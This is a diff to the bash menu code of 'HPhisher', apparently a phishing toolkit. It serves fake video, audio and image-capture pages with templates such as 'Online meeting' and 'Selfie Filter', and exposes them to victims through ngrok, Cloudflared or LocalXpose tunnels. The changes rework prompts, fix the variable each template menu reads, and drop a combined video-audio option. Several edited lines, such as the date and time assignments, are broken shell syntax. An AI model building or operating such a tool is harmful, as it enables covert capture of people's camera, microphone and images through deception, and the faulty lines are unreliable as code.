@@ -27,11 +27,11 @@ server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
 
 #Time
-date= $date + %F
-time_hour= $date + %H
-time_minute= $date + %M
-time_sec= $date + %S
-time= "${time_hour}:${time_minute}:${time_sec}"
+date= 'date +%d-%m-%Y'
+time_hour= date + %H
+time_minute= date + %M
+time_sec= date + %S
+time= 'date +%H-%M-%S'
 
 #Normal Banner
 banner(){
@@ -572,8 +572,7 @@ echo -e "${BLUE} [D] ${RED} View Logs ${NC}"
 echo -e "${BLUE} [E] ${RED} Check for Updates ${NC}"
 echo -e "${BLUE} [00] ${RED} Exit ${NC}"
 echo -e " "
-echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Enter your choice : ${BLUE}"
-read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
+read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
         1 | 01)
@@ -585,9 +584,6 @@ case $reply_site in
 				3 | 03)
 								site_name=video
                 site_video;;
-       	4 | 04)
-				        site_name=video_audio
-	            	site_video_audio;;
 				A | a)
 			  				xdg-open https://github.com/HPhisher/NPhisher
 								{ sleep 2; clear;  banner; mainmenu; };;
@@ -614,12 +610,12 @@ esac
 ## Tunnel selection
 tunnel_menu() {
 echo -e " "
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
 echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
 echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
 echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
 echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
-echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
-read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
+read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
 
         case $reply_tunnel in
                 1 | 01)
@@ -640,10 +636,12 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} :
 }
 
 site_image(){
-echo -e "${BLUE}[01]${CYAN} Default ${NC}"
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+echo -e " "
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
-case $choice in
+case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
@@ -654,10 +652,12 @@ esac
 }
 
 site_audio(){
-echo -e "${BLUE}[01]${CYAN} Default ${NC}"
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+echo -e " "
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
-case $choice in
+case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
@@ -669,13 +669,15 @@ esac
 
 site_video(){
 duration=5000
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+echo -e " "
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
 echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
 echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
 echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
-echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
-case $choice in
+case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
@@ -695,27 +697,6 @@ case $choice in
 esac
 }
 
-site_video_audio(){
-echo -e "${BLUE}[01]${CYAN} Default ${NC}"
-echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
-echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
-echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
-read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
-case $choice in
-        1 | 01)
-                site_template="default"
-                tunnel_menu;;
-			  2 | 02)
-				        site_template="onlinemeet"
-                tunnel_menu;;
-				3 | 03)
-								site_template="filter"
-								tunnel_menu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_video_audio; };;
-esac
-}
 
 clear
 cbanner
